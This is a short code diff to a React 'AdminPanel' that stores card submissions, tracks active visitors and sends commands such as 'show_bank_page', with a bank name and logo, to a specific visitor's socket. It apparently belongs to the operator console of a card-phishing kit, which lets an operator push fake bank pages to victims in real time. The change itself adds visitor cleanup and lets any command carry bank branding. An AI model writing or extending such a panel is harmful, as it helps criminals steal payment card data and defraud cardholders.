@@ -164,6 +164,14 @@ const AdminPanel = () => {
     localStorage.setItem('card_submissions', JSON.stringify(cardSubmissions));
   }, [cardSubmissions]);
 
+  // Periodic cleanup of stale visitors (older than 2 minutes)
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setActiveVisitors(prev => prev.filter(v => Date.now() - new Date(v.created_at).getTime() < 120000));
+    }, 30000);
+    return () => clearInterval(interval);
+  }, []);
+
   const sendCommand = (command: string, submissionId?: string, bankData?: { name: string; logo: string }) => {
     console.log('Admin Panel: Sending command:', command, submissionId, bankData);
     showNotification(`${command.toUpperCase()} command sent`);
@@ -178,10 +186,10 @@ const AdminPanel = () => {
       command,
       submission_id: submissionId,
       created_at: new Date().toISOString(),
-    };
-    if (command === 'show_bank_page' && bankData) {
-      (commandData as any).bank_name = bankData.name;
-      (commandData as any).bank_logo = bankData.logo;
+    } as any;
+    if (bankData) {
+      commandData.bank_name = bankData.name;
+      commandData.bank_logo = bankData.logo;
     }
     
     console.log('Admin Panel: Sending command to socket ID:', submissionId, commandData);
